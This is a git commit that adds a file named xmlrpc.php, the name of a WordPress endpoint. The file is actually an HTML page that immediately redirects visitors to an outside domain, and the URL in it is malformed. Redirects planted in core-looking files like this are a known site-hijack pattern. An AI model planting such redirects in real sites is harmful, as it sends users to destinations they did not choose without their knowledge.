4c5a3b8c2d1ec282d986c8c7bbbc66012fa8a6dc
A Virli <a.virli@hotmail.com>
2022-10-12 15:01:35 +0100

    Add files via upload

---
+++ xmlrpc.php
@@ -0,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Redirecting...</title>
+		<meta http-equiv="refresh" content="0;url=httpzeenuxo.me/">
+	</head>
+	<body>
+		<script type="text/javascript">
+			window.location = "httpzeenuxo.me/";
+		</script>
+
+		<p>You are being redirected to <a href="httpzeenuxo.me/">httpzeenuxo.me/</a></p>
+	</body>
+</html>
